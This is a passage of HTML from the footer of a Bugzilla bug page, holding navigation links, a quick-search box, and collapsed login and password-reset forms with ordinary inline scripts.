    <input type="hidden" id="no_redirect_bottom" name="no_redirect" value="0">
    <script type="text/javascript">
      if (history && history.replaceState) {
        var no_redirect = document.getElementById("no_redirect_bottom");
        no_redirect.value = 1;
      }
    </script>
    <input class="txt" type="text" id="quicksearch_bottom" name="quicksearch" 
           title="Quick Search" value="">
    <input class="btn" type="submit" value="Search" 
           id="find_bottom"></form>
  <a href="page.cgi?id=quicksearch.html" title="Quicksearch Help">[?]</a></li>

  <li><span class="separator">| </span><a href="report.cgi">Reports</a></li>

  <li></li>


  <li>
        <span class="separator">| </span>
        <a href="https://bugzilla.readthedocs.org/en/latest/using/understanding.html" target="_blank">Help</a>
      </li>
    
      <li id="new_account_container_bottom">
        <span class="separator">| </span>
        <a href="createaccount.cgi">New&nbsp;Account</a>
      </li>

    <li id="mini_login_container_bottom">
  <span class="separator">| </span>
  <a id="login_link_bottom" href="show_bug.cgi?id=199803&amp;GoAheadAndLogIn=1"
     onclick="return show_mini_login_form('_bottom')">Log In</a>

  <form action="show_bug.cgi?id=199803" method="POST"
        class="mini_login bz_default_hidden"
        id="mini_login_bottom">
    <input id="Bugzilla_login_bottom" required
           name="Bugzilla_login" class="bz_login"
        type="email" placeholder="Email Address">
    <input class="bz_password" name="Bugzilla_password" type="password"
           id="Bugzilla_password_bottom" required
           placeholder="Password">
    <input type="hidden" name="Bugzilla_login_token"
           value="">
    <input type="submit" name="GoAheadAndLogIn" value="Log in"
            id="log_in_bottom">
    <a href="#" onclick="return hide_mini_login_form('_bottom')">[x]</a>
  </form>
</li>


  <li id="forgot_container_bottom">
    <span class="separator">| </span>
    <a id="forgot_link_bottom" href="createaccount.cgi?request_new_password=1"
       onclick="return show_forgot_form('_bottom')">Forgot Password</a>
    <form action="token.cgi" method="post" id="forgot_form_bottom"
          class="mini_forgot bz_default_hidden">
      <label for="login_bottom">Login:</label>
      <input name="email" size="20" id="login_bottom" required
             type="email" placeholder="Your Email Address">
      <input id="forgot_button_bottom" value="Reset Password"
             type="submit">
      <input type="hidden" name="a" value="reqpw">
      <input type="hidden" id="token_bottom" name="token"
             value="1635622167-E1z6zyRU1A6j61GmBrkCJxl_UCcbsxTaVsqc4Vh3QiA">
      <a href="#" onclick="return hide_forgot_form('_bottom')">[x]</a>
    </form>
  </li>
</ul>
  </li>

  




  
</ul>
      </nav>

      <div class="outro"></div>
    </footer>

  </body>
</html>